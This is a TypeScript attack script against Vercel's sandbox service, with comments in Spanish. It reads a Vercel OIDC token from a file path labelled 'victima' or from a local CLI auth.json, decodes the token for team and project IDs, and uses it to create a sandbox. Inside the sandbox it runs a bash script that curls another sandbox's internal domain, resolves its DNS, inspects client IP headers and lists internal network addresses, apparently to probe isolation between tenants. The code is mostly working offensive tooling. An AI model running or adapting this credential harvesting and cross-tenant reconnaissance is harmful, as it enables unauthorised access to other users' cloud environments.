import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const SCRIPT = `
set +e
echo "=== 1. curl interno a sb-4j0y9rk6yws9.vercel.run ==="
timeout 8 curl -s --max-time 6 https://sb-4j0y9rk6yws9.vercel.run/ 2>&1 | head -50
echo ""
echo "=== 2. DNS interno del dominio ==="
getent hosts sb-4j0y9rk6yws9.vercel.run
echo ""
echo "=== 3. repetir 3 veces (el nodo interno cambia?) ==="
for i in 1 2 3; do
  echo "--- vez $i ---"
  timeout 8 curl -s --max-time 6 https://sb-4j0y9rk6yws9.vercel.run/ 2>&1 | grep -oE '"clientIp": "[^"]+"|"x-forwarded-for": "[^"]+"|"x-real-ip": "[^"]+"'
done
echo ""
echo "=== 4. mi IP interna en la red de celdas ==="
ip -o addr | grep eth0 | grep inet
echo "=== DONE ==="
`;

async function main() {
  const sbx = await Sandbox.create({
    name: "curl-v3-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 60_000 });
  const out = await r.output("both");
  console.log(out);
  console.log("DONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });